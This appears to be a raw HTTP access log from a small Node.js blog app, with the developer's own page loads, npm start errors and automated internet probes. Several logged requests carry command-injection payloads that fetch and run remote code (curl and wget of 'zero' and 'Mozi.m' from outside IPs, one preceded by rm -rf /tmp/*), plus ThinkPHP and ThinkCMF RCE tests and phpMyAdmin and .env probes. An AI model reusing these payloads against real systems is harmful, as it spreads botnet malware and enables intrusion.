[0mGET / [32m200 [0m9.898 ms - 239[0m
[0mGET / [32m200 [0m11.340 ms - 239[0m
[0mGET / [32m200 [0m6.430 ms - 239[0m
[0mGET / [32m200 [0m4.393 ms - 239[0m
[0mGET / [32m200 [0m3.795 ms - 239[0m
[0mGET / [32m200 [0m15.829 ms - 239[0m
[0mGET / [32m200 [0m5.316 ms - 239[0m
[0mGET / [32m200 [0m5.315 ms - 239[0m
[0mGET / [32m200 [0m4.093 ms - 239[0m
[0mGET / [32m200 [0m6.190 ms - 239[0m
[0mGET /portal/redlion [33m404 [0m4.284 ms - 1032[0m
[0mGET / [32m200 [0m3.721 ms - 239[0m
[0mGET /config/getuser?index=0 [33m404 [0m6.780 ms - 1032[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m4.806 ms - 1032[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m8.786 ms - 1032[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m8.960 ms - 1032[0m
[0mGET /pma/scripts/setup.php [33m404 [0m4.561 ms - 1032[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m4.725 ms - 1032[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m5.328 ms - 1032[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m4.175 ms - 1032[0m
[0mGET /config/getuser?index=0 [33m404 [0m4.705 ms - 1032[0m
[0mGET / [32m200 [0m8.014 ms - 239[0m
[0mGET / [32m200 [0m3.626 ms - 239[0m
[0mGET / [32m200 [0m4.226 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m4.041 ms - 1032[0m
[0mGET / [32m200 [0m5.296 ms - 239[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m15.900 ms - 1032[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m4.109 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m4.370 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m11.486 ms - 1032[0m
[0mGET / [32m200 [0m4.655 ms - 239[0m
[0mGET / [32m200 [0m4.183 ms - 239[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://114.32.123.186:49659/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m4.481 ms - 1032[0m
[0mGET / [32m200 [0m10.296 ms - 239[0m
[0mGET / [32m200 [0m7.939 ms - 239[0m
[0mGET / [32m200 [0m3.754 ms - 239[0m
[0mGET / [32m200 [0m4.561 ms - 239[0m
[0mGET /.env [33m404 [0m11.445 ms - 1032[0m
[0mPOST / [33m404 [0m13.348 ms - 1032[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m5.794 ms - 1032[0m
[0mPOST /api/jsonws/invoke [33m404 [0m3.921 ms - 1032[0m
[0mGET / [36m304 [0m3.946 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.414 ms - -[0m
[0mGET /AddBlog [33m404 [0m10.642 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.365 ms - -[0m
[0mGET /ListBlogs [33m404 [0m4.238 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.378 ms - -[0m
[0mGET / [32m200 [0m11.669 ms - 239[0m
[0mGET /solr/ [33m404 [0m4.283 ms - 1032[0m
[0mGET /ListBlogs [33m404 [0m17.746 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.432 ms - -[0m
[0mGET /AddBlog [33m404 [0m5.987 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.394 ms - -[0m
[0mGET / [36m304 [0m3.455 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.858 ms - -[0m
[0mGET /AddBlog [33m404 [0m3.793 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.452 ms - -[0m
[0mGET /ListBlogs [33m404 [0m4.376 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.495 ms - -[0m
[0mGET / [36m304 [0m4.097 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.332 ms - -[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

Port 80 is already in use
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2020-09-23T20_58_26_953Z-debug.log
[0mGET / [36m304 [0m4.650 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.349 ms - -[0m
[0mGET /AddBlog [33m404 [0m8.194 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.383 ms - -[0m
[0mGET /ListBlogs [33m404 [0m4.249 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.381 ms - -[0m
[0mGET /AddBlog [33m404 [0m4.224 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.325 ms - -[0m
[0mGET / [36m304 [0m4.096 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.445 ms - -[0m
[0mGET /AddBlog [33m404 [0m4.403 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.346 ms - -[0m
[0mGET /addblog [33m404 [0m7.159 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.894 ms - -[0m
[0mGET /add-blog [33m404 [0m3.955 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.395 ms - -[0m
[0mGET /list-blogs [33m404 [0m4.409 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.339 ms - -[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [36m304 [0m221.133 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.766 ms - -[0m
[0mGET /stylesheets/font-awesome.min.css [33m404 [0m57.180 ms - 2146[0m
[0mGET /stylesheets/style.css [36m304 [0m0.960 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.361 ms - -[0m
[0mGET / [36m304 [0m34.312 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.391 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m2.263 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m2.373 ms - -[0m
[0mGET /stylesheets/font-awesome.min.css [33m404 [0m66.777 ms - 2146[0m
[0mGET /list-blogs/ [32m200 [0m46.748 ms - 1319[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.381 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.181 ms - -[0m
[0mGET /stylesheets/font-awesome.min.css [33m404 [0m16.275 ms - 2146[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m16.584 ms - -[0m
[0mGET /add-blog/ [36m304 [0m108.584 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.410 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.068 ms - -[0m
[0mGET /stylesheets/font-awesome.min.css [33m404 [0m28.465 ms - 2146[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m28.644 ms - -[0m
[0mGET /list-blogs/ [36m304 [0m15.271 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.362 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.068 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.120 ms - -[0m
[0mGET /stylesheets/font-awesome.min.css [33m404 [0m15.188 ms - 2146[0m
[0mGET / [36m304 [0m51.395 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.461 ms - -[0m
[0mGET /stylesheets/font-awesome.min.css [33m404 [0m48.135 ms - 2146[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.325 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.315 ms - -[0m
[0mGET /list-blogs/ [36m304 [0m57.043 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.419 ms - -[0m
[0mGET /stylesheets/font-awesome.min.css [33m404 [0m45.501 ms - 2146[0m
[0mGET /stylesheets/style.css [36m304 [0m45.615 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m45.662 ms - -[0m
[0mGET /add-blog/ [36m304 [0m61.071 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.721 ms - -[0m
[0mGET /stylesheets/font-awesome.min.css [33m404 [0m44.136 ms - 2146[0m
[0mGET /stylesheets/style.css [36m304 [0m0.623 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.676 ms - -[0m
